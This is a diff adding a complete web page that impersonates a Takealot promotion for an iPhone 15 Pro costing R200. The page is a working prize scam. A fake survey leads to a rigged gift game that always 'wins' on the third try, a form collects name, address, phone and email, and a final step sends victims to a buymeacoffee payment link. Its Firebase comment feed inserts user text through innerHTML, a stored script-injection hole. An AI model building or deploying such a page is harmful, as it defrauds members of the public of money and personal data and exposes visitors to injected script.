@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>iPhone 15 Pro Promotion</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f1f1f1;
+      margin: 0;
+      padding: 0;
+      text-align: center;
+      color: #333;
+    }
+    .container {
+      max-width: 600px;
+      margin: 50px auto;
+      background: #fff;
+      padding: 30px;
+      border-radius: 15px;
+      box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+    }
+    button {
+      background-color: #1976d2;
+      color: white;
+      border: none;
+      padding: 15px 25px;
+      margin: 10px 5px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1565c0;
+    }
+    .gift-boxes {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      margin: 20px 0;
+    }
+    .gift-button {
+      background: none;
+      border: none;
+      padding: 0;
+      cursor: pointer;
+    }
+    .gift-button img {
+      width: 100px;
+      transition: transform 0.3s ease;
+    }
+    .gift-button.opened img {
+      transform: scale(1.2);
+    }
+    /* Emoji gift button style */
+    .gift-button {
+      font-size: 50px;
+      width: 100px;
+      height: 100px;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      transition: transform 0.3s ease;
+    }
+    .gift-button.opened {
+      transform: scale(1.2);
+    }
+    input, textarea {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+    }
+    .hidden { display: none; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Congratulations!</h1>
+    <p>You have been selected to participate in the promotion from Takealot.<br>
+    You have a chance to win an iPhone 15 Pro for only R200.</p>
+    <img src="iphone.jpg" alt="iPhone 15 Pro" style="max-width:100%;">
+    <p><strong>To receive your iPhone 15 Pro, you need to complete the survey to
+ confirm you are a real person.</strong></p>
+    <button onclick="showQuestions()">Start Survey</button>
+
+    <div id="questions" class="hidden">
+      <p>Question 1 of 3: Are you from South Africa?</p>
+      <button onclick="nextQuestion(2)">Yes</button>
+      <button onclick="endSurvey()">No</button>
+      <div id="q2" class="hidden">
+        <p>Question 2 of 3: Did you buy something online recently?</p>
+        <button onclick="nextQuestion(3)">Yes</button>
+        <button onclick="endSurvey()">No</button>
+      </div>
+      <div id="q3" class="hidden">
+        <p>Question 3 of 3: Would you like to receive the iPhone 15 Pro for 
+ R200?</p>
+        <button onclick="showGiftGame()">Yes</button>
+        <button onclick="endSurvey()">No</button>
+      </div>
+    </div>
+
+    <div id="commentSection" class="hidden">
+      <h3>Leave a Comment:</h3>
+      <textarea id="commentInput" rows="4" placeholder="Your 
+ comment..."></textarea>
+      <input type="file" id="imageInput" accept="image/*"><br>
+      <button onclick="submitComment()">Submit</button>
+      <div id="commentList" style="margin-top: 20px; text-align: left;"></div>
+    </div>
+  </div>
+
+  <div class="container hidden" id="giftGame">
+    <p>Choose the right gift box. You have <strong>3 tries</strong>. Good 
+ luck!</p>
+    <div class="gift-boxes" id="giftBoxes"></div>
+  </div>
+
+  <div class="container hidden" id="formSection">
+    <h2>Congratulations! You've won!</h2>
+    <img src="iphone.jpg" alt="iPhone 15 Pro" style="width:120px;">
+    <p>1) Click on 'Apply now'.<br>2) Fill in the form and pay for 
+ delivery.<br>3) Delivery within 3 to 5 working days.</p>
+    <button onclick="showForm()">Apply Now</button>
+  </div>
+
+  <div class="container hidden" id="formPage">
+    <h3>Fill in your details</h3>
+    <input type="text" placeholder="First Name" id="firstName">
+    <input type="text" placeholder="Last Name" id="lastName">
+    <input type="text" placeholder="Address" id="address">
+    <input type="text" placeholder="Postal Code" id="postal">
+    <input type="text" placeholder="City" id="city">
+    <input type="text" placeholder="Contact Number" id="contact">
+    <input type="email" placeholder="Email" id="email">
+    <button onclick="validateAndProceed()">Continue</button>
+  </div>
+
+  <div class="container hidden" id="paymentPage">
+    <h2>Final Step</h2>
+    <p>Please proceed to pay the R200 delivery fee to receive your iPhone 15 
+ Pro.<br>Delivery in 3 to 5 working days.</p>
+    <p><strong>To complete your winning gift:</strong><br>
+    Click <strong>Support</strong>, enter <strong>$12</strong> and your 
+ <strong>name</strong>, then click <strong>Support</strong> again to finish!</p>
+    <img src="iphone.jpg" alt="iPhone 15 Pro" style="width:100px;">
+    <button onclick="location.href='https://buymeacoffee.com/terro/claim-your-iphone-15-pro-r200'">Pay Now</button>
+  </div>
+  
+  <script>
+    let tries = 0;
+
+    function showQuestions() {
+      document.getElementById("questions").classList.remove("hidden");
+    }
+
+    function nextQuestion(q) {
+      if (q === 2) document.getElementById("q2").classList.remove("hidden");
+      if (q === 3) {
+        document.getElementById("q3").classList.remove("hidden");
+        document.getElementById("commentSection").classList.remove("hidden");
+      }
+    }
+
+    function endSurvey() {
+      alert("Sorry, this offer is only for selected participants.");
+      location.reload();
+    }
+
+    function showGiftGame() {
+      document.querySelector('.container').classList.add("hidden");
+      document.getElementById("giftGame").classList.remove("hidden");
+      generateGiftBoxes();
+    }
+
+    function generateGiftBoxes() {
+      const boxContainer = document.getElementById("giftBoxes");
+      boxContainer.innerHTML = "";
+
+      for (let i = 0; i < 9; i++) {
+        const btn = document.createElement("button");
+        btn.className = "gift-button";
+        btn.textContent = "🎁";
+        btn.onclick = () => pickBox(btn);
+        boxContainer.appendChild(btn);
+      }
+    }
+
+    function pickBox(btn) {
+      if (btn.classList.contains("opened")) return;
+      if (tries >= 3) return;
+
+      btn.classList.add("opened");
+
+      if (tries === 2) {
+        btn.innerHTML = '<img src="iphone.jpg" style="width:50px;">';
+        setTimeout(() => {
+          document.getElementById("giftGame").classList.add("hidden");
+          document.getElementById("formSection").classList.remove("hidden");
+        }, 1000);
+      } else {
+        btn.innerHTML = "Empty";
+      }
+
+      tries++;
+    }
+
+    function submitComment() {
+      // replaced by Firebase integration
+    }
+
+    function showForm() {
+      document.getElementById("formSection").classList.add("hidden");
+      document.getElementById("formPage").classList.remove("hidden");
+    }
+
+    function validateAndProceed() {
+      let allFilled = ["firstName", "lastName", "address", "postal", "city", 
+ "contact", "email"].every(id => document.getElementById(id).value);
+      if (!allFilled) return alert("Please fill in all details.");
+      document.getElementById("formPage").classList.add("hidden");
+      document.getElementById("paymentPage").classList.remove("hidden");
+    }
+  </script>
+
+  <script type="module">
+    // Import Firebase modules
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+    import { getFirestore, collection, addDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyB8KPxMYaCZCnp6HUm9Yfz2adcixzUCJOw",
+      authDomain: "iphone15pro-147cd.firebaseapp.com",
+      projectId: "iphone15pro-147cd",
+      storageBucket: "iphone15pro-147cd.firebasestorage.app",
+      messagingSenderId: "204039526715",
+      appId: "1:204039526715:web:45a02d603b60fe0acb7f1e",
+      measurementId: "G-KCJZH3R48D"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+    const commentsCol = collection(db, "comments");
+    const commentList = document.getElementById("commentList");
+
+    // Function to render a comment
+    function renderComment(data) {
+      const div = document.createElement("div");
+      div.style.border = "1px solid #ccc";
+      div.style.padding = "10px";
+      div.style.marginBottom = "10px";
+      div.innerHTML = `<p>${data.text}</p>`;
+      if (data.image) {
+        const img = document.createElement("img");
+        img.src = data.image;
+        img.style.maxWidth = "100px";
+        div.appendChild(img);
+      }
+      const likeBtn = document.createElement("button");
+      likeBtn.textContent = "Like (0)";
+      let count = 0;
+      likeBtn.onclick = () => {
+        count++;
+        likeBtn.textContent = "Like (" + count + ")";
+      };
+      div.appendChild(likeBtn);
+      commentList.appendChild(div);
+    }
+
+    // Listen for new comments in Firestore
+    onSnapshot(commentsCol, (snapshot) => {
+      snapshot.docChanges().forEach((change) => {
+        if (change.type === "added") {
+          renderComment(change.doc.data());
+        }
+      });
+    });
+
+    // Override submitComment to save to Firestore
+    window.submitComment = async function() {
+      const text = document.getElementById("commentInput").value.trim();
+      const imageInput = document.getElementById("imageInput");
+      if (!text && !imageInput.files.length) {
+        alert("Please write something or upload an image");
+        return;
+      }
+      let docData = { text: text };
+      if (imageInput.files.length) {
+        const file = imageInput.files[0];
+        const reader = new FileReader();
+        reader.onload = async e => {
+          docData.image = e.target.result;
+          try {
+            await addDoc(commentsCol, docData);
+            document.getElementById("commentInput").value = "";
+            imageInput.value = "";
+          } catch (error) {
+            console.error("Error adding document: ", error);
+          }
+        };
+        reader.readAsDataURL(file);
+      } else {
+        try {
+          await addDoc(commentsCol, docData);
+          document.getElementById("commentInput").value = "";
+          imageInput.value = "";
+        } catch (error) {
+          console.error("Error adding document: ", error);
+        }
+      }
+    };
+  </script>
+</body>
+</html>
